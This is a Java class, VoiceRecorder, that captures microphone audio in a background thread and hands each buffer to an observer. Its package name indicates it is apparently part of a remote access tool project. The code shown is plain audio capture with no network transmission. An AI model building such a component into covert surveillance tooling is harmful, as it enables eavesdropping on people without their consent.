package de.sogomn.rat.util;

import java.util.function.Consumer;

import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.TargetDataLine;

public final class VoiceRecorder {
	
	private TargetDataLine line;
	private Thread thread;
	private boolean running;
	
	private byte[] data;
	
	private Consumer<VoiceRecorder> observer;
	
	public VoiceRecorder(final int bufferSize) {
		data = new byte[bufferSize];
	}
	
	public void start() {
		if (running) {
			return;
		}
		
		final Runnable runnable = () -> {
			while (running) {
				line.read(data, 0, data.length);
				
				if (observer != null) {
					observer.accept(this);
				}
			}
		};
		
		try {
			line = AudioSystem.getTargetDataLine(null);
			thread = new Thread(runnable);
			running = true;
			
			line.open();
			line.start();
			thread.start();
		} catch (final Exception ex) {
			stop();
			
			data = new byte[0];
			
			ex.printStackTrace();
		}
	}
	
	public void stop() {
		if (!running) {
			return;
		}
		
		running = false;
		
		try {
			thread.interrupt();
			line.stop();
			line.close();
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
		
		thread = null;
		line = null;
	}
	
	public void setObserver(final Consumer<VoiceRecorder> observer) {
		this.observer = observer;
	}
	
	public boolean isRunning() {
		return running;
	}
	
	public byte[] getLastRecord() {
		return data;
	}
	
}
